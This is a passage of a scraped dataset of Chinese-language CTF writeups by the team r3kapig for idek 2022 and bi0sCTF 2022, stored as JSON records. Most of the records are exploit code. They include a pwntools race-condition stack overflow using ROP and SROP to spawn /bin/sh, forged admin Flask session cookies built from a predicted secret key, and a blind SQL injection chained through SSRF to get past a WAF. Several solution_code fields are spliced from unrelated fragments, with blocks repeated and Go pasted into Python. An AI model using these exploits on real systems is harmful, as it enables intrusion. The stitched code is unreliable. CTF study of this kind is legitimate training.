data=userinfo, allow_redirects=False).headers['Set-Cookie']\n    cookie = set_cookie[8:82]\n\n\ndef upload():\n    global log_url\n    log_url = re.search('<a href=\"/uploads/.*\">', sess.post(\n        baseurl + \"upload\", headers={'Cookie': f'session={cookie}'},\n        files={'file': base64.b64decode(pocZip)}).text).group()[9:-2]\n\ndef read():\n    server_log = baseurl + log_url + \"/server.log\"\n    config = baseurl + log_url + \"/config.py\"\n    SECRET_OFFSET = int(re.findall(\"SECRET_OFFSET = (.*?) # REDACTED\", sess.get(config).text)[0]) * 1000\n    log = sess.get(server_log).text\n    now = (time.mktime(datetime.datetime.strptime(log.split('\\n')[0][1:20], \"%Y-%m-%d %H:%M:%S\").timetuple())) * 1000\n    return SECRET_OFFSET,now\n\n\n\nif __name__ == '__main__':\n    register()\n    login()\n    upload()\n    SECRET_OFFSET, now = read()\n    while 1:\n        decoded = {'admin': True, 'uid': userinfo['username']}\n        random.seed(round(now + int(SECRET_OFFSET)))\n        SECRET_KEY = \"\".join([hex(random.randint(0, 15)) for x in range(32)]).replace(\"0x\", \"\")\n        flag_url = baseurl + \"flag\"\n        res = sess.get(flag_url, headers={'Cookie': f'session={flask_unsign.sign(decoded, SECRET_KEY)}'}).text\n        if \"idek\" not in res:\n            now += 1\n            print(now)\n            continue\n        print(res)\n        break\n\n        ctx := context.Background()\n        for _, o := range reqData.Orders {\n                if err := validator.CheckReadOrder(o); err != nil {\n                        w.WriteHeader(500)\n                        w.Write([]byte(fmt.Sprintf(\"error: %v\\n\", err)))\n                        return\n                }\n\n\n                ctx = WithValidatorCtx(ctx, reader, int(o))\n                _, err := validator.Read(ctx)\n                if err != nil {\n                        w.WriteHeader(500)\n                        w.Write([]byte(fmt.Sprintf(\"failed to read: %v\\n\", err)))\n                        return\n                }\n        }\n\n\n        if err := validator.Validate(ctx); err != nil {\n                w.WriteHeader(500)\n                w.Write([]byte(fmt.Sprintf(\"validation failed: %v\\n\", err)))\n                return\n        }\n\n\n                w.WriteHeader(500)\n                w.Write([]byte(fmt.Sprintf(\"validation failed: %v\\n\", err)))\n                return\n        }\n\n\n    register()\n    login()\n    upload()\n    SECRET_OFFSET, now = read()\n    while 1:\n        decoded = {'admin': True, 'uid': userinfo['username']}\n        random.seed(round(now + int(SECRET_OFFSET)))\n        SECRET_KEY = \"\".join([hex(random.randint(0, 15)) for x in range(32)]).replace(\"0x\", \"\")\n        flag_url = baseurl + \"flag\"\n        res = sess.get(flag_url, headers={'Cookie': f'session={flask_unsign.sign(decoded, SECRET_KEY)}'}).text\n        if \"idek\" not in res:\n            now += 1\n            print(now)\n            continue\n        print(res)\n        break\n\n\n    io.recvuntil(b\"|  > \")\n    mid = (l+r)//2\n    if i % 20 == 0:\n        print(hex(mid))\n    now = pow(mid, e, n)\n    io.sendline(long_to_bytes(now).hex().encode())\n    res = io.recvline()\n    if b\"Q_Q\" in res:\n        l = mid + 1\n    else:\n        r = mid \n\n\n    for i in range(d):\n        print(new_mat1[i, j], end = \" \")\n    print()\n\n\n    ll _p = p[i], _q = q[i];\n    if (i % 100000 == 0)\n      printf(\"%d\\n\", i);\n\n\n    for (int j = 0; j < 23; j++)\n      _l[j] = (_p >> j) & 1;\n    for (int j = 0; j < 24; j++)\n      _l[j + 23] = (_q >> j) & 1;\n    for (int i = 511; i >= 0; i--) {\n      int bit_p = 0;\n      for (ll x : posp[i]) {\n        bit_p ^= _l[x];\n      }\n      fprintf(f, \"%c\", '0' + bit_p);\n      if (i < 23) {\n        assert(bit_p == _l[i]);\n      }\n    }\n    fprintf(f, \" \");\n    for (int i = 511; i >= 0; i--) {\n      int bit_q = 0;\n      for (ll x : posq[i])\n        bit_q ^= _l[x];\n      fprintf(f, \"%c\", '0' + bit_q);\n      if (i < 24) {\n        assert(bit_q == _l[i + 23]);\n      }\n    }\n    fprintf(f, \"\\n\");\n\n\n    host, port = 'psychophobia.chal.idek.team 1337'.split(' ')\n    io = remote(host, int(port))\n    io.recvuntil(b\"|    > \")\n    io.sendline(b\"1\")\n    msg = \"1 here, requesting flag for pick-up.\"\n    h = int.from_bytes(sha256(msg.encode()).digest(), 'big')\n    for round in range(500):\n        print(f\"round-{round}\")\n        io.recvuntil(b'Please fix :: ')\n        tmp = io.recvline()\n        sig = literal_eval(tmp.strip().decode())\n        r, s = sig\n        fix_s = fix(r, s)\n        io.recvuntil(b'|    > (r,s) ')\n        io.sendline(f'{r},{fix_s}'.encode())\n\n\n    io.recvuntil(b\"signatures!\\n\")\n    io.recvline()\n    tmp = io.recvline()\n    print(tmp)\n    if b\"{\" in tmp:\n        print(\"get flag!\")\n        io.close()\n        input()\n    else:\n        io.close()\n", "tools": ["sage", "python", "pycryptodome", "gmpy2"], "file_path": "temp_repos\\r3kapig_writeup\\20230120-idek2022-Web_Crypto\\README.md", "file_size": 39458, "scraped_at": "2025-10-26T18:19:26.884325"}
{"id": "r3kapig_writeup_bi0sCTF2022_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "bi0sCTF2022 Writeup", "attack_type": "AES", "writeup": "# bi0sCTF2022 Writeup\n\n## 前言:\n\n本次bi0sCTF 2022属于休闲玩玩,我们获得了第四名.其中有部分题目还是很有趣.现将师傅们的writeup整理如下,长期招新欢迎感兴趣的师傅简历`root@r3kapig.com`\n\n![](https://imgur.com/NJL3VZx.png)\n\n## Pwn:\n\n### Notes:\n\n(本题开始看的时间有点晚了,导致没有在比赛时间内完成,赛后整理writeup)\n\n程序启动了两个线程，两个线程共用一段共享内存，然后等待两个线程执行完\n\n![](https://imgur.com/xOISXmm.png)\n\n漏洞点在于条件竞争，另一个线程可以在检查过后改掉size，从而造成栈溢出\n\n比赛时的问题有三点:\n\n1. 不知道怎么卡条件竞争的时间，爆破影响了数据流\n2. 知道泄露Libc，但是返回main函数之后多个相同功能的进程在执行，乱了\n3. 想到了SROP，但是当时想的是用read的返回值来控制rax，然后并没有可以直接用的read，只有read_input\n\n条件竞争的时间可以用一次add和encrypt然后sleep(6)来卡，这样可以执行完第一个compare并发送sent，这样就保证了两个线程的时间基本是同步的，而无需爆破，然后sleep(2)通过检查后把size改掉，造成栈溢出\n\n方法1:利用memcpy的参数变化来执行execve\n\n如果控制size为0x3b0，memcpy的三个参数会是这样\n\n![](https://imgur.com/Ve0iYqG.png)\n\n结束以后的参数，可以看到rcx和rdx以及rsi的内容都是memcpy可以控制的，而syscall函数里会把rcx给rdx，把rdx给rsi，把rsi给rdi，所以只要控制系统调用号为59就可以了，具体的实现跟源码有关系（有点复杂）只能说赛后很碰巧看到了参数的内容貌似是可控的 ，赛中观察过这个点 但貌似当时的参数不行\n\n![](https://imgur.com/HArQdtM.png)\n\n![](https://imgur.com/IZsHwTb.png)\n\nexp:\n\n```py\nfrom pwn import *\n\np = process('./notes')\n#p=remote('pwn.chall.bi0s.in',37981)\nlibc=ELF('./libc.so.6')\nelf=ELF('./notes')\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\nr = lambda x: p.recv(x)\nra = lambda: p.recvall()\nrl = lambda: p.recvline(keepends=True)\nru = lambda x: p.recvuntil(x, drop=True)\nsl = lambda x: p.sendline(x)\nsa = lambda x, y: p.sendafter(x, y)\nsla = lambda x, y: p.sendlineafter(x, y)\nia = lambda: p.interactive()\nc = lambda: p.close()\nli = lambda x: log.info(x)\ndb = lambda: gdb.attach(p)\ndef menu(ch):\n    sla('Enter Choice: ',str(ch))\ndef add(id,name,size,cont):\n    sl('1')\n    sla('Enter Note ID: ',str(id))\n    sa('Enter Note Name:',name)\n    sla('Enter Note Size: ',str(size))\n    sa('Enter Note Content: ',cont)\ndef delete(idx):\n    menu(2)\n    sla('Enter Note ID: ',str(idx))\ndef show(idx,name,cont):\n    menu(3)\n    sla('Enter Note ID: ',str(idx))\n    sla('Note Name: ',name)\n    sla('Enter Note Content: ', cont)\ndef edit(size,name):\n    menu(4)\n    sla('Enter Note Size: ',str(size))\n    sla('Enter Name: ',name)\ndef encrypt(idx,cont):\n    menu(5)\n    sla('Enter Note ID: ',str(idx))\n    sla('Enter Note Content: ',cont)\n\ndef decrypt(cont):\n    return xor(cont, b\"2111485077978050\")\nsyscall=0x401bc2\npoprdi=0x0000000000401bc0\npoprbp=0x00000000004011ed\n#gdb.attach(p,'b* 0x401B7A')\nadd(0,'aaa',0x20,'\\x00'*8)\npayload='\\x00'*0x48+p64(poprdi)+p64(0x3b)+p64(elf.sym['syscall'])+'\\x00'*0x330+'/bin/sh\\x00'*4\nencrypt(0,decrypt(payload))\nsleep(6)\nadd(0,'aaa',0x20,'\\x00'*8)\nsleep(2)\nedit(len(payload),'\\x00'*8)\nsleep(3)\n\np.interactive()\n```\n\n另外官方中给的方法是SROP(`https://discord.com/channels/862962550169665568/1063844806977130596/1066734947768999946`)，比赛中也想到了用SROP，只不过想用read的返回值来控制rax，忘了可以直接syscall了，先往bss段写一个/bin/sh，然后执行SROP即可.这里脚本参考了部分来自于sAsPeCt师傅(`sAsPeCt#8643`)的脚本(`https://discord.com/channels/862962550169665568/1063844806977130596/1066799179550171237`)\n\nexp:\n\n```py\nfrom pwn import *\n\np = process('./notes')\n#p=remote('pwn.chall.bi0s.in',37981)\nlibc=ELF('./libc.so.6')\nelf=ELF('./notes')\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\nr = lambda x: p.recv(x)\nra = lambda: p.recvall()\nrl = lambda: p.recvline(keepends=True)\nru = lambda x: p.recvuntil(x, drop=True)\nsl = lambda x: p.sendline(x)\nsa = lambda x, y: p.sendafter(x, y)\nsla = lambda x, y: p.sendlineafter(x, y)\nia = lambda: p.interactive()\nc = lambda: p.close()\nli = lambda x: log.info(x)\ndb = lambda: gdb.attach(p)\ndef menu(ch):\n    sla('Enter Choice: ',str(ch))\ndef add(id,name,size,cont):\n    sl('1')\n    sla('Enter Note ID: ',str(id))\n    sa('Enter Note Name:',name)\n    sla('Enter Note Size: ',str(size))\n    sa('Enter Note Content: ',cont)\ndef delete(idx):\n    menu(2)\n    sla('Enter Note ID: ',str(idx))\ndef show(idx,name,cont):\n    menu(3)\n    sla('Enter Note ID: ',str(idx))\n    sla('Note Name: ',name)\n    sla('Enter Note Content: ', cont)\ndef edit(size,name):\n    menu(4)\n    sla('Enter Note Size: ',str(size))\n    sla('Enter Name: ',name)\ndef encrypt(idx,cont):\n    menu(5)\n    sla('Enter Note ID: ',str(idx))\n    sla('Enter Note Content: ',cont)\n\ndef decrypt(cont):\n    return xor(cont, b\"2111485077978050\")\nsyscall=0x401bc2\npoprdi=0x0000000000401bc0\npoprbp=0x00000000004011ed\ngdb.attach(p,'b* 0x401B7A')\nadd(0,'aaa',0x20,'\\x00'*8)\nbss= 0x404100\nframe = SigreturnFrame(kernel='amd64')\nframe.rip = 0x401bc2 # syscall;\nframe.rax = 59 # RT_SIGRETURN\nframe.rdi = bss # /bin/sh\nframe.rsi = 0x404200 # NULL\nframe.rdx = 0x404208 # NULL\n\npayload = b\"A\" * 64 + p64(0) + p64(poprdi) + p64(bss) + p64(0x4013D6) + p64(poprdi) + p64(15) + p64(elf.plt['syscall']) + bytes(frame)\nencrypt(0,decrypt(payload))\nsleep(6)\nadd(0,'aaa',0x20,'\\x00'*8)\nsleep(2)\nedit(len(payload),'\\x00'*8)\nsleep(3)\nsla(b\"Sent\", b\"/bin/sh\\x00\")\nsl('/bin/sh\\x00')\nsl('/bin/sh\\x00')\np.interactive()\n```\n\n## Web:\n\n### Vuln-Drive 2:\n\n#### 分析:\n\n首先简单看看docker-compose.yml，发现php环境在外网\n\n根据networks配置可知waf与其他两个环境互通，frontend与app不互通\n\n![](https://imgur.com/2YzLTfs.png)\n\n#### 审计:\n\n以下为了方便叙述思路，将调整讲解的顺序，其中会涉及到部分穿插\n\n##### waf:\n\n这个容器中运行了一个go程序\n\n```go\npackage main\n\nimport (\n        \"fmt\"\n        \"log\"\n        \"net/htt", "solution_code": "key = [\n    0x52, 0xFD, 0xFC, 0x07, 0x21, 0x82, 0x65, 0x4F, 0x16, 0x3F, \n    0x5F, 0x0F, 0x9A, 0x62, 0x1D, 0x72, 0x95, 0x66, 0xC7, 0x4D, \n    0x10, 0x03, 0x7C, 0x4D, 0x7B, 0xBB, 0x04, 0x07, 0xD1, 0xE2, \n    0xC6, 0x49\n]\n\niv = [\n    0x81, 0x85, 0x5A, 0xD8, 0x68, 0x1D, 0x0D, 0x86, 0xD1, 0xE9, \n    0x1E, 0x00, 0x16, 0x79, 0x39, 0xCB\n]\n\ncipherText = []\n\nfrom PIL import Image\n\nimage = Image.open('enc.png')\n\nfor i in range(100):\n    r, g, b, a = image.getpixel((i, 99))\n    if a != 0:\n        cipherText.append(r)\n\nfor i in range(len(cipherText)):\n    cipherText[i] ^= i\n\nfrom Crypto.Cipher import AES\n\ncipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))\n\nplainText = cipher.decrypt(bytes(cipherText))\nprint (plainText)\ncipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))\n\nplainText = cipher.decrypt(plainText[:-16])\nprint (plainText)\n\nfrom gmssl.sm4 import CryptSM4, SM4_DECRYPT\nimport z3\n\ni = [z3.BitVec(f'i{_}', 64) for _ in range(8)]\nsolver = z3.Solver()\nsolver.add(i[0] - 0x93A3F3CD == 0)\nsolver.add((i[1] ^ 0x1337BEEF) - 0x33AEF5CB == 0)\nsolver.add((i[2] ^ i[4]) - 0x550D68CE == 0)\nsolver.add((i[2] ^ i[3]) - 0x5F9751EB == 0)\nsolver.add(0x2C786553 - (i[6] ^ i[7]) == 0)\nsolver.add(0x04AA34A4 - (i[5] ^ i[7]) == 0)\nsolver.add((i[2] ^ i[3] ^ i[4]) - 0x74180051 == 0)\nsolver.add((i[5] ^ i[6] ^ i[7]) - 0x3E07994C == 0)\n\nif solver.check() == z3.sat:\n    m = solver.model()\n    e = ''.join(hex(m[i[_]].as_long()).replace(\"0x\", \"\") for _ in range(8))\n    print(e)\n    e = bytes.fromhex(e)\n    sm4 = CryptSM4()\n    sm4.set_key(bytes.fromhex(\"554248506A424B6C73513254754E536B\"), SM4_DECRYPT)\n    print(sm4.crypt_cbc(bytes.fromhex('3779304D3639545153636D376D665876'), e))\n\nfrom Crypto.Util.number import *\n\npublic = [1]\nfor i in range(2, 91):\n    public.append(public[-1]*i)\nq = sum(public)\npublic = public[::-1]\nr = 439336960671443073145803863477\nct =  [(85, 2009755672435753240933297922620729942110285100089234834611189610638944428122270966606450209287004686147490741726074233399923807772025455384), (87, 4996607263053501712119670315411210635641476911112656716346186101581162098939506206462698692878856867719374177604968008598982986859155008123), (87, 4837953870616520482139098354277306810171956043791834010204071803405678054968703256907153189059041329376000508442178425613919361101370091597), (87, 2933251583165904105425041103443198171501175581919361545836839336222902826332690613281372817019459906816365925875888304559050438360535693754), (87, 3687643521316276110350069295074808763624177150637370283489602776297956670406673088896906135313859622547057266461156951352840606158133939326), (85, 1338269001646504891852362627714857562957599731250242281507737655117481275381522940187354460968741738873145343823622277547003496172474140929), (88, 7933296831307546148859657742504382496951023270916400508699917815337497611045057441275885597739792345698682705664067022591023419704320903682), (88, 5551940689407978486506000896917506389553250109195458521661213619690861850998613004330276887098156130761269810440548744569924180624922795113), (84, 4231118499738387243085586897653540321361890016337481573279774741827125072054069869204040621495890626440611926639348835434382399384680055422), (85, 4704615409370307656606356674605132679559694819773906599372238093928995241862651680281288235856744305731307534075261385839804274777809615349), (88, 8080256207998531514821351856269697662773084407605094205301308544428843939544685672982309353297946702140050231399104513874885470725033197665), (88, 5409126049900711181553897969759692389994841569000620092514718715454021797905578507700126871105210241868943216288008246115824215988452628610), (87, 9252119153621946581189075112355267174890952393437560488066048810424246555795717704306898381332924931192879341998003358581626937969846419514), (88, 4309485343027874993328683769447337855319861832898927390313412221773647599911173732334028315977555272520439642698050646195173212678056296824), (87, 7585821393024154059281324167310518147335428246416250953866063679865301977430635054486170591035445789330984486529581273451159109931487791502), (87, 4266559781861060657731014334455291598689251074723949797856286897802219958857948301662899795696748957745131495362941575798432727634477829169), (85, 2641970821454174926450206596995181582610648509828849026215891906920020076919398240347027542452996819530972432115175678566086129470049375389), (86, 3077438307667140950446795937461054813957511252383671895612002141778156796698300700433893422617209993376314581927862590976739430303756825799), (84, 6606999799754153651147831000154190219518207430742825676139927743071667153908159445512098245423654757585044526053832363134210629951000894424), (88, 5670578370066772514741437284311647297873639929831922637574590430528630079731096253156055423807240883352926044290617794045498770071653673648), (87, 6894132144232319468740512750496837680809983881874187255032194645685827169634783788480774942267705885439820208999500465383743432841886297780), (88, 6348559834296411797469331328911826454137045759724408730535584371919321718963812479226912064993936288733920150791627489465935504738729746712), (87, 7457067309408071136462520290099813600595760616382451252266638576757556195357758384430233685566475045370258747830063483558129016033041534121), (87, 7138834056650788599340304091245357448689914704543367476875970477848587821892811763578094466693024724929034161719556439516286550418480386826), (85, 4214620981374285095640824086913124961419729602098347661701803957979165936606167686524401563099707189265200486482516005732059773306234258420), (87, 7739066385937951930229094506964291860284170243142110190122036300802992602806430896564185899709833543891933679072444463084661529668059219104), (86, 7996763147644153267931052506581385268378745125996592054161290689392831593366496210631236238142447646254463386914159791951904746842709666621), (83, 2363927368088545362888027832425184786062409622322321649991521010872009124933023792724085312213031828468440431258319304817389205319949123017), (86, 8952178949693065428977346330331508030115172989418887909205463101008773555390353195154597245789628940426095401145185560848927781578325104633), (87, 5437733249052136209105079687557091961563919494484950700755430118355692330802405578709308644911805929080699188377572804834481019970451287210), (88, 6015299972513982077146707497576267202666793107003902152334693697774096888512046451228148219477544391600946101222260160929679756603685952858), (88, 4568852671731251436040898868989551602956632306950375030804513367391992286782270552341135397170272362552944089560054885656717064705695931608), (88, 5214418374014497232007521802148945843762329611158152570151078790657020448385624421117820553224634987052518291618670107521494031262847423514), (85, 4868781049816097655711690233312446779184038900364456479177916582789767967134191139603006712483609665048365174590374678749717762853252392898), (87, 7487878378499555558388350908281092245535427011554302229088273963701472371659945154073798520163320208196872977374676841353329741664704431049), (88, 4804650300297155317595282760599161747288241275410480931480258003053935686370721999717184367371623277273540661128542000775004283694728585525), (87, 6324353155591926121419512579497192374524354396151314193997508188259969434627055717937503525281909856550845807173753553651932260148517039625), (87, 5546469224661430242652418747991106002905180051710879985326544434722895447041925331360634907813012794515907098935485171653197695779005009826), (86, 6493922061250196900387871627336695511599800586007321943800903718034500613505566204881495072235610494479661303981584755703237874004730700241), (84, 3304267236247240014753455621608696126482869339445549240138779235284450054938719633292333925332195771054789798560540593262065547955691287860), (86, 7470707627092056238764393981318045721888042683539521453158125764519328859948265999477619788387120366063077899885955739104933799243393828710), (88, 6674831873895816998217860257081780104168741154329195649911902365299495130324698497916172758145782383658122037059537201009889153133307754158), (88, 5323014117483698150842190422231005724805137799598831691161862346623039247622359972881775361362745899238680458901399065283489317592046388919), (85, 3763698408921732607951773848228884704668238062686979349129116312470621538052054791662510364394420612090312977770614743449723324784458538150)]\n\nciphertext = []\nfor i in range(len(ct)):#len(ct)):\n    n,s = ct[i]\n    st = int(s   * inverse(r,q))  % q\n    strs = \"\"\n    for puc_inv in public[-n:]:\n        if st > puc_inv or (puc_inv == 1 and st == 1):\n            st = st % puc_inv\n            strs = \"1\" + strs\n        else:\n            strs = \"0\" + strs\n\n    ciphertext.append(int(strs,2))\nprint(ciphertext[:4])\n\nFLAG_FORMAT = \"bi0s\"\n\nNBITS = 44<<2\n\na = 0xBAD2C0DE\nc = 0x6969\nm = 1<<NBITS\n'''\n\nfor i,f in enumerate(FLAG):\n    state = (state*a+c)%m\n    ciphertext.append((state>>(NBITS>>1))^^i^^ord(f))\n'''\nstates = [0]\nfor i,f in enumerate(FLAG_FORMAT):\n    states.append((ciphertext[i]^i^ord(f))<<(NBITS>>1))\n# print(states)\n# print(NBITS>>1)\n# s1 + s1_ = (s0 + s0_) * a + c %m\n# (s1 - a*s0-c) + s1_ - a*s0_ %m\n\n'''A = [1]\nB = [0]\nfor i in range(1, len(states)-1):\n    A.append(a*A[i-1] % m)\n    B.append((a*B[i-1]+a*states[i]+c-states[i+1]) % m)\nA = A[1:]\nB = B[1:]\nM = matrix(ZZ, 2+len(A), 2+len(A))\n\nfor i in range(len(A)):\n    M[i, i] = m\n    M[len(A), i] = A[i]\n    M[len(A)+1, i] = B[i]\n    M[i, len(A)] = M[i, len(A)+1] = 0\nM[len(A), len(A)] =  1\nM[len(A)+1, len(A)+1] = 2^88\nM[len(A), len(A)+1]= 0\nML = M.LLL()'''\nstates = states[1:]\n[264893701359261384184087199,96391972943163767741116235,308702811501065345352543347,304985483494140320227177621]\nprint((((states[0]+304985483494140320227177621)*a+c)%m)>>(NBITS>>1) == states[1]>>(NBITS>>1))\n\nseed = ((states[0]+304985483494140320227177621 - c) * inverse(a,m)) % m \nprint(seed)\n\na = 0xBAD2C0DE\nc = 0x6969\nm = 1<<NBITS\nstate = states[0]+304985483494140320227177621\n\nplaintext = []\n\nfor i in range(44):\n    if i==0:\n        continue\n    state = (state*a+c)%m\n    plaintext.append((state>>(NBITS>>1))^i^ciphertext[i])\nprint(b'b' + bytes(plaintext))\n#bi0sctf{lcg_is_good_until_you_break_them_!!}\n\nimport websocket\n\nws = websocket.WebSocket()\n\nws.connect(\"ws://instance.chall.bi0s.in:10130/\")\n\nimport json\nresp = ws.recv()\nhead = [26, 26]\ns = \"\"\nwhile head[0] > 0:\n    head[0] -= 1\n    s += \"u\"\nwhile head[1] > 0:\n    head[1] -= 1\n    s += \"l\"\nws.send(s)\nresp = json.loads(ws.recv())\nassert(resp[\"head\"] == [0, 0])\n\ns1 = \"d\"*30+\"r\"+\"u\"*29+\"r\"+\"d\"*29+\"r\"+\"rulu\"*13+\"ruulurr\"+(\"d\"*29+\"r\"+\"u\"*29+\"r\")*12+\"d\"*29+\"r\"+\"u\"*30+\"l\"*30\ns2 = \"d\"*30+\"r\"+\"u\"*29+\"r\"+\"d\"*29+\"r\"+\"rulu\"*13+\"urulurr\"+(\"d\"*29+\"r\"+\"u\"*29+\"r\")*12+\"d\"*29+\"r\"+\"u\"*30+\"l\"*30\n\ndef check(s):\n    head = [0, 0]\n    size = 31\n    d = {}\n    for ch in s:\n        if ch == \"l\":\n            head[-1] -= 1\n        elif ch == \"r\":\n            head[-1] += 1\n        elif ch == \"u\":\n            head[0] -= 1\n        else:\n            head[0] += 1\n        assert 0 <= head[0] < size\n        assert 0 <= head[1] < size\n        assert(tuple(head) not in d)\n        d[tuple(head)] = 1\n    assert head == [0, 0]\n\ncheck(s1)\ncheck(s2)\nassert(len(s1) == 960)\nassert(len(s2) == 960)\n\nwhile True:\n    ws.send(s1)\n    resp = ws.recv()\n    print(resp)\n    resp = json.loads(resp)\n    if (\"flag\" in resp):\n        print(resp[\"flag\"])\n        break\n    ws.send(s2)\n    resp = ws.recv()\n    print(resp)\n    resp = json.loads(resp)\n    if (\"flag\" in resp):\n        print(resp[\"flag\"])\n        break\n\nws.close()\n\n    return func(w http.ResponseWriter, r http.Request) {\n                if(r.Header.Get(\"X-pro-hacker\")!=\"\"){\n                     fmt.Fprintf(w, \"Hello Hacker!\\n\")\n                     return\n                }\n                if(strings.Contains(r.Header.Get(\"flag\"), \"gimme\")){\n                    fmt.Fprintf(w, \"No flag For you!\\n\")\n                    return\n                }\n                if(r.Header.Get(\"Token\")!=\"\"){\n                    for _, x := range invalid {\n                            if(strings.Contains(r.Header.Get(\"Token\"), x)){\n                                fmt.Fprintf(w, \"Hello Hacker!\\n\")\n                                return  \n                            }\n\n\n        url, err := url.Parse(\"http://app:5000\")\n    if err != nil {\n        fmt.Println(err)\n    }\n        proxy := httputil.NewSingleHostReverseProxy(url)\n\n\n        http.HandleFunc(\"/\", ProxyRequestHandler(proxy))\n        http.HandleFunc(\"/admin\", func(w http.ResponseWriter, r *http.Request) {\n                fmt.Fprintf(w, \"Hello World!\\n\")\n\n\n    try: \n        conn = sqlite3.connect(os.path.join(os.path.realpath(os.curdir),'users.db'))\n        cursor = conn.cursor()\n        result = cursor.executescript(f\"\"\"\n            CREATE TABLE IF NOT EXISTS users  (\n                                                    username  TEXT, \n                                                    token TEXT\n                                                );\n            CREATE TABLE IF NOT EXISTS flag  (\n                                                flag_is_here  TEXT\n                                            );                                                  \n            Delete from users;\n            Delete from flag;\n            INSERT INTO users values ('user','some_randomtoken'),\n                                    ('admi','some_randomtoken'),\n                                    (\n                                        'admin',\n                                        '{FLAG}'\n                                    );\n            INSERT INTO flag values ('{FLAG}');\n            \"\"\")\n        conn.commit()\n        return True\n    except:\n        return False\n\n\n    while not init_db():\n        continue\n    if request.headers.get(\"X-pro-hacker\")==\"Pro-hacker\" and \"gimme\" in request.headers.get(\"flag\"):\n        try:\n            if request.headers.get(\"Token\"):         \n                token = request.headers.get(\"Token\")\n                token = token[:16]\n                token = token.replace(\" \",\"\").replace('\"',\"\")\n                if request.form.get(\"user\"):\n                    user = request.form.get(\"user\")\n                    user = user[:38]\n                    add_user(user,token)            \n                query = f'SELECT * FROM users WHERE token=\"{token}\"'\n                res = db_query(query)\n                res = res.fetchone()\n                return res[1] if res and len(res[0])>0  else \"INDEX\\n\"\n        except Exception as e:\n            print(e) \n    return \"INDEX\\n\"\n\n\n    for token in flag_chars:\n        with requests.Session() as s:\n            sqli = f\"user=a',substr((select * from flag),{i + 1},1))-- \"\n            username = hijack_tpl.format(token, len(sqli), sqli)\n\n\n            # ssrf -> bypass waf -> blind sqli, fol=. or fol=/\n            if 'INDEX' not in s.get(f\"{base_url}/view.php?fol=.&file=http://{txt}\").text:\n                flag += token\n                print(f\"bi0sctf{{{flag}}}\", end='\\r')\n                break\n\n\n    print(\"Content-Type: text/html\")\n    print()\n    print(\"Exception\")\n    print(str(e))\n\n\n    def __init__(self):\n        self.response_headers = {}\n        self.response_body = \"\"\n        self.post_body = \"\"\n        self.request_method = self.get_var(\"REQUEST_METHOD\")\n        self.content_length = 0\n\n\n    def get_params(self):\n        request_uri = self.get_var(\"REQUEST_URI\") if  self.get_var(\"REQUEST_URI\") else \"\"\n        params_dict = {}\n        if \"?\" in request_uri:\n            params = request_uri.split(\"?\")[1]\n            if \"&\" in params:\n                params = params.split(\"&\")\n                for param in params:\n                    params_dict[param.split(\"=\")[0]] = param.split(\"=\")[1]\n            else:\n                params_dict[params.split(\"=\")[0]] = params.split(\"=\")[1]\n        return params_dict\n\n\n    def get_var(self, variable):\n        return environ.get(variable)\n\n\n    def set_header(self, header, value):\n        self.response_headers[header] = value\n\n\n    def add_body(self, value):\n        self.response_body += value\n\n\n    def send_file(self, filename):\n        self.response_body += open(filename, \"r\").read()\n\n\n    def send_response(self):\n        for header in self.response_headers:\n            print(f\"{header}: {self.response_headers[header]}\\n\")\n\n\n        print(\"\\n\")\n        print(self.response_body)\n        print(\"\\n\")\n\n\n    m = solver.model()\n    e = ''.join(hex(m[i[_]].as_long()).replace(\"0x\", \"\") for _ in range(8))\n    print(e)\n    e = bytes.fromhex(e)\n    sm4 = CryptSM4()\n    sm4.set_key(bytes.fromhex(\"554248506A424B6C73513254754E536B\"), SM4_DECRYPT)\n    print(sm4.crypt_cbc(bytes.fromhex('3779304D3639545153636D376D665876'), e))\n\n\n    ll f2 = ((res2 - f1 * 17 - f1 * f1 % mod * 2) % mod * inv13) % mod;\n    if (((f2 * 6 + f1 * 105 + f1 * f2 % mod * 5 - f1 * f1 % mod * 4) % mod + mod) % mod == res3) {\n      f2 = (f2 + mod) % modmoo;\n      unsigned long long tf1 = f1, tf2 = f2;\n      if ((tf1 * 17 + tf2 * 13 + tf1 * tf1 * 2) % mod != res2) continue;\n      if (((tf2 * 6 + tf1 * 105 + tf1 * tf2 * 5 - tf1 * tf1 * 4) % mod + mod) % mod != res3) continue;\n      ll x = ((res1 - f2 * f2 % mod * 5) % mod + mod) % mod;\n      ll y = ((105 - f2 * 5) % mod + mod) % mod;\n      y = power(y, mod-2, mod);\n      ll f3 = (x * y % mod + mod) % mod;\n      x = (res0 - f3 * f3 % mod * 5) % mod;\n      y = (303 - f3 * 4) % mod;\n      y = power(y, mod-2, mod);\n      ll f4 = (x * y % mod + mod) % mod;\n      unsigned long long tf3 = f3, tf4 = f4;\n      if (((tf4 * 303 + tf3 * tf3 * 5 - tf4 * tf3 * 4) % mod + mod) % mod != res0) continue;\n      if (((tf3 * 105 + tf2 * tf2 * 5 - tf2 * tf3 * 5) % mod + mod) % mod != res1) continue;\n      printf(\"%lld %lld %lld %lld\\n\", f1, f2, f3, f4);\n    }\n\n\n    ws.send(s1)\n    resp = ws.recv()\n    print(resp)\n    resp = json.loads(resp)\n    if (\"flag\" in resp):\n        print(resp[\"flag\"])\n        break\n    ws.send(s2)\n    resp = ws.recv()\n    print(resp)\n    resp = json.loads(resp)\n    if (\"flag\" in resp):\n        print(resp[\"flag\"])\n        break\n", "tools": ["sage", "python", "pycryptodome", "z3", "gdb"], "file_path": "temp_repos\\r3kapig_writeup\\20230124-bi0s2022\\README.md", "file_size": 47318, "scraped_at": "2025-10-26T18:19:26.904238"}
